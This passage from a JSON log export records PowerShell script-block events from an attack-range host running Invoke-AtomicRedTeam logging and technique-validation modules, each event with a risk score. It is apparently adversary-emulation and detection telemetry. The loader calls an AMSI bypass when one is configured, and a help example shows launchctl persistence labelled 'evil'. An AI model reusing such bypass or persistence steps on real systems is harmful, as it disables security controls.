$executionId\n        'execution-category' = $executionCategory\n        'execution-command'  = $commandLine\n        target               = $target\n        'time-generated'     = \"\"\n    }\n\n    $script:attireLog.'execution-data' = $executionData\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n\n    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n\n    $procedureId = [PSCustomObject]@{\n        type = \"guid\"\n        id   = $testGuid\n    }\n\n    $step = [PSCustomObject]@{\n        'order'      = 1\n        'time-start' = $startTime\n        'time-stop'  = $stopTime\n        'executor'   = $testExecutor\n        'command'    = $command\n        'process-id' = $res.ProcessId\n        'exit-code'  = $res.ExitCode\n        'is-timeout' = $res.IsTimeout\n        'output'     = @()\n    }\n\n    $stdOutContents = $res.StandardOutput\n    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {\n        $stdOutContents = $stdOutContents.ToString()\n    }\n\n    $outputStdConsole = [PSCustomObject]@{\n        content = $stdOutContents\n        level   = \"STDOUT\"\n        type    = \"console\"\n    }\n\n    $stdErrContents = $res.ErrorOutput\n    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {\n        $stdErrContents = $stdErrContents.ToString()\n    }\n\n    $outputErrConsole = [PSCustomObject]@{\n        content = $stdErrContents\n        level   = \"STDERR\"\n        type    = \"console\"\n    }\n\n    [bool] $foundOutput = $false\n    if ($res.StandardOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputStdConsole\n    }\n\n    if ($res.ErrorOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputErrConsole\n    }\n\n    if (!$foundOutput) {\n        $emptyOutput = [PSCustomObject]@{\n            content = \"\"\n            level   = \"STDOUT\"\n            type    = \"console\"\n        }\n        $step.output += $emptyOutput\n    }\n\n    $procedure = [PSCustomObject]@{\n        'mitre-technique-id'    = $technique\n        'procedure-name'        = $testName\n        'procedure-id'          = $procedureId\n        'procedure-description' = $testDescription\n        order                   = $testNum\n        steps                   = @()\n    }\n\n    $procedure.steps += $step\n\n    $script:attireLog.procedures += $procedure\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')\n    #$script:attireLog | Export-Csv -Path \"attireLogObject.csv\"\n    $content = ($script:attireLog | ConvertTo-Json -Depth 12)\n    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False\n    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)\n    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII\n    $script:attireLog = [PSCustomObject]@{\n        'attire-version' = '1.1'\n        'execution-data' = ''\n        procedures       = @()\n    }\n}\n\nfunction Resolve-NonexistantPath($File) {\n    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error\n\n    if (-not($Path)) {\n        $Path = $error[0].TargetObject\n    }\n\n    return $Path\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3374567+00:00",
      "event_id": 35710527,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1699,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    # send syslog message if a syslog server is defined in Public/config.ps1\n    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        $jsonMsg = $msg | ConvertTo-Json -Compress\n        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity \"Informational\" -Facility \"daemon\" -Transport $artConfig.syslogProtocol\n    }\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3415737+00:00",
      "event_id": 35710530,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1654,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {\n        New-EventLog -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\"\n    }\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    Write-EventLog  -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3467872+00:00",
      "event_id": 35710533,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 847,
      "full_command": "#requires -Version 5.0\n\n# execute amsi bypass if configured to use one\nif([bool]$artConfig.absb -and ($artConfig.OS -eq \"windows\")){\n    $artConfig.absb.Invoke()\n}\n\n#Get public and private function definition files.\n$Public = @( Get-ChildItem -Path $PSScriptRoot\\Public\\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )\n$Private = @( Get-ChildItem -Path $PSScriptRoot\\Private\\*.ps1 -Recurse -Exclude \"AtomicClassSchema.ps1\" -ErrorAction SilentlyContinue )\n\n# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)\n. \"$PSScriptRoot\\Private\\AtomicClassSchema.ps1\"\n\n#Dot source the files\nForeach ($import in @($Public + $Private)) {\n    Try {\n        . $import.fullname\n    }\n    Catch {\n        Write-Error -Message \"Failed to import function $($import.fullname): $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.393942+00:00",
      "event_id": 35710539,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 14843,
      "full_command": "filter Get-AtomicTechnique {\n    <#\n    .SYNOPSIS\n\n    Retrieve and validate an atomic technique.\n\n    .DESCRIPTION\n\n    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.\n\n    This function facilitates the following use cases:\n\n    1) Validation prior to execution of atomic tests.\n    2) Writing code to reason over one or more atomic techniques/tests.\n    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.\n    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.\n\n    .PARAMETER Path\n\n    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.\n\n    .PARAMETER Yaml\n\n    Specifies a single string consisting of raw atomic technique YAML.\n\n    .EXAMPLE\n\n    Get-ChildItem -Path C:\\atomic-red-team\\atomics\\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-Item C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-AtomicTechnique -Path C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml\n\n    .EXAMPLE\n\n    $Yaml = @'\n    ---\n    attack_technique: T1152\n    display_name: Launchctl\n\n    atomic_tests:\n    - name: Launchctl\n      description: |\n        Utilize launchctl\n\n      supported_platforms:\n        - macos\n\n      executor:\n        name: sh\n        command: |\n          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n    '@\n\n    Get-AtomicTechnique -Yaml $Yaml\n\n    .INPUTS\n\n    System.IO.FileInfo\n\n    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.\n\n    .OUTPUTS\n\n    AtomicTechnique\n\n    Outputs an object representing a parsed and validated atomic technique.\n    #>\n\n    [CmdletBinding(DefaultParameterSetName = 'FilePath')]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]\n        [String]\n        [Alias('FullName')]\n        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]\n        $Path,\n\n        [Parameter(Mandatory, ParameterSetName = 'Yaml')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Yaml\n    )\n\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'FilePath' {\n            $ResolvedPath = Resolve-Path -Path $Path\n\n            $YamlContent = Get-Content -Path $ResolvedPath -Raw\n            $ErrorStringPrefix = \"[$($ResolvedPath)]\"\n        }\n\n        'Yaml' {\n            $YamlContent = $Yaml\n            $ErrorStringPrefix = ''\n        }\n    }\n\n    $ParsedYaml = $null\n\n    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')\n    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')\n\n    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.\n    # Capture the exception and convert to PowerShell error so that the user can decide\n    # how to handle the error.\n    try {\n        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent\n    }\n    catch {\n        Write-Error $_\n    }\n\n    if ($ParsedYaml) {\n        # The document was well-formed YAML. Now, validate against the atomic red schema\n\n        $AtomicInstance = [AtomicTechnique]::new()\n\n        if (-not $ParsedYaml.Count) {\n            Write-Error \"$ErrorStringPrefix YAML file has no elements.\"\n            return\n        }\n\n        if (-not $ParsedYaml.ContainsKey('attack_technique')) {\n            Write-Error \"$ErrorStringPrefix 'attack_technique' element is required.\"\n            return\n        }\n\n        $AttackTechnique = $null\n\n        if ($ParsedYaml['attack_technique'].Count -gt 1) {\n            # An array of attack techniques are supported.\n            foreach ($Technique in $ParsedYaml['attack_technique']) {\n                if (\"$Technique\" -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n                    Write-Warning \"$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.\"\n                }\n\n                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']\n            }\n        }\n        else {\n            if ((-not \"$($ParsedYaml['attack_technique'])\".StartsWith('T'))) {\n                # If the attack technique is a single entry, validate that it starts with the letter T.\n                Write-Warning \"$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.\"\n            }\n\n            [String] $AttackTechnique = $ParsedYaml['attack_technique']\n        }\n\n        $AtomicInstance.attack_technique = $AttackTechnique\n\n        if (-not $ParsedYaml.ContainsKey('display_name')) {\n            Write-Error \"$ErrorStringPrefix 'display_name' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['display_name'] -is [String])) {\n            Write-Error \"$ErrorStringPrefix 'display_name' must be a string.\"\n            return\n        }\n\n        $AtomicInstance.display_name = $ParsedYaml['display_name']\n\n        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element must be an array.\"\n            return\n        }\n\n        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)\n\n        if (-not $ParsedYaml['atomic_tests'].Count) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.\"\n            return\n        }\n\n        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {\n            $AtomicTest = $ParsedYaml['atomic_tests'][$i]\n\n            $AtomicTestInstance = [AtomicTest]::new()\n\n            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n            if (-not $AtomicTest.ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.name = $AtomicTest['name']\n            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']\n\n            if (-not $AtomicTest.ContainsKey('description')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['description'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.description = $AtomicTest['description']\n\n            if (-not $AtomicTest.ContainsKey('supported_platforms')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.\"\n                return\n            }\n\n            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {\n                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {\n                    Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').\"\n                }\n            }\n\n            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']\n\n            $Dependencies = $null\n\n            if ($AtomicTest['dependencies'].Count) {\n                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)\n                $j = 0\n\n                # dependencies are optional and there can be multiple\n                foreach ($Dependency in $AtomicTest['dependencies']) {\n                    $DependencyInstance = [AtomicDependency]::new()\n\n                    if (-not $Dependency.ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.description = $Dependency['description']\n                    $StringsWithPotentialInputArgs.Add($Dependency['description'])\n\n                    if (-not $Dependency.ContainsKey('prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.prereq_command = $Dependency['prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])\n\n                    if (-not $Dependency.ContainsKey('get_prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['get_prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])\n\n                    $Dependencies[$j] = $DependencyInstance\n\n                    $j++\n                }\n\n                $AtomicTestInstance.dependencies = $Dependencies\n            }\n\n            if ($AtomicTest.ContainsKey('dependency_executor_name')) {\n                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').\"\n                    return\n                }\n\n                if ($null -eq $AtomicTestInstance.Dependencies) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.\"\n                }\n\n                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']\n            }\n\n            $InputArguments = $null\n\n            # input_arguments is optional\n            if ($AtomicTest.ContainsKey('input_arguments')) {\n                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {\n                    $AtomicTest['input_arguments'].GetType().FullName\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['input_arguments'].Count)) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.\"\n                    return\n                }\n\n                $InputArguments = @{}\n\n                $j = 0\n\n                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {\n\n                    $InputArgument = [AtomicInputArgument]::new()\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.\"\n                        return\n                    }\n\n                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.\"\n                        return\n                    }\n\n                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1280187+00:00",
      "event_id": 35710663,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 6031,
      "full_command": "# Attire-ExecutionLogger.psm1\n# Copyright 2023 Security Risk Advisors\n\n# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the â€œSoftwareâ€),\n# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\n# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED â€œAS ISâ€, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n$script:attireLog = [PSCustomObject]@{\n    'attire-version' = '1.1'\n    'execution-data' = ''\n    'procedures'     = @()\n}\n\nfunction Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    if ($targetUser -isnot [string]) {\n        if ([bool]($targetUser.PSobject.Properties.name -match \"^value$\")) {\n            $targetUser = $targetUser.value\n        }\n        else {\n            $targetUser = $targetUser.ToString()\n        }\n    }\n    if ($targetHostname -isnot [string]) {\n        if ([bool]($targetHostname.PSobject.Properties.name -match \"^value$\")) {\n            $targetHostname = $targetHostname.value\n        }\n        else {\n            $targetHostname = $targetHostname.ToString()\n        }\n    }\n\n    $target = [PSCustomObject]@{\n        user = $targetUser\n        host = $targetHostname\n        ip   = $ipAddress\n        path = $Env:PATH\n    }\n\n    $guid = New-Guid\n    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)\n    $executionId = [Convert]::ToBase64String($bytes)\n\n    $executionCategory = [PSCustomObject]@{\n        'name'         = \"Atomic Red Team\"\n        'abbreviation' = \"ART\"\n    }\n\n    $executionData = [PSCustomObject]@{\n        'execution-source'   = \"Invoke-Atomicredteam\"\n        'execution-id'       = $executionId\n        'execution-category' = $executionCategory\n        'execution-command'  = $commandLine\n        target               = $target\n        'time-generated'     = \"\"\n    }\n\n    $script:attireLog.'execution-data' = $executionData\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n\n    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()\n\n    $procedureId = [PSCustomObject]@{\n        type = \"guid\"\n        id   = $testGuid\n    }\n\n    $step = [PSCustomObject]@{\n        'order'      = 1\n        'time-start' = $startTime\n        'time-stop'  = $stopTime\n        'executor'   = $testExecutor\n        'command'    = $command\n        'process-id' = $res.ProcessId\n        'exit-code'  = $res.ExitCode\n        'is-timeout' = $res.IsTimeout\n        'output'     = @()\n    }\n\n    $stdOutContents = $res.StandardOutput\n    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {\n        $stdOutContents = $stdOutContents.ToString()\n    }\n\n    $outputStdConsole = [PSCustomObject]@{\n        content = $stdOutContents\n        level   = \"STDOUT\"\n        type    = \"console\"\n    }\n\n    $stdErrContents = $res.ErrorOutput\n    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {\n        $stdErrContents = $stdErrContents.ToString()\n    }\n\n    $outputErrConsole = [PSCustomObject]@{\n        content = $stdErrContents\n        level   = \"STDERR\"\n        type    = \"console\"\n    }\n\n    [bool] $foundOutput = $false\n    if ($res.StandardOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputStdConsole\n    }\n\n    if ($res.ErrorOutput.length -gt 0) {\n        $foundOutput = $true\n        $step.output += $outputErrConsole\n    }\n\n    if (!$foundOutput) {\n        $emptyOutput = [PSCustomObject]@{\n            content = \"\"\n            level   = \"STDOUT\"\n            type    = \"console\"\n        }\n        $step.output += $emptyOutput\n    }\n\n    $procedure = [PSCustomObject]@{\n        'mitre-technique-id'    = $technique\n        'procedure-name'        = $testName\n        'procedure-id'          = $procedureId\n        'procedure-description' = $testDescription\n        order                   = $testNum\n        steps                   = @()\n    }\n\n    $procedure.steps += $step\n\n    $script:attireLog.procedures += $procedure\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')\n    #$script:attireLog | Export-Csv -Path \"attireLogObject.csv\"\n    $content = ($script:attireLog | ConvertTo-Json -Depth 12)\n    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False\n    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)\n    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII\n    $script:attireLog = [PSCustomObject]@{\n        'attire-version' = '1.1'\n        'execution-data' = ''\n        procedures       = @()\n    }\n}\n\nfunction Resolve-NonexistantPath($File) {\n    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error\n\n    if (-not($Path)) {\n        $Path = $error[0].TargetObject\n    }\n\n    return $Path\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1325533+00:00",
      "event_id": 35710666,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1699,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    # send syslog message if a syslog server is defined in Public/config.ps1\n    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        $jsonMsg = $msg | ConvertTo-Json -Compress\n        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity \"Informational\" -Facility \"daemon\" -Transport $artConfig.syslogProtocol\n    }\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, 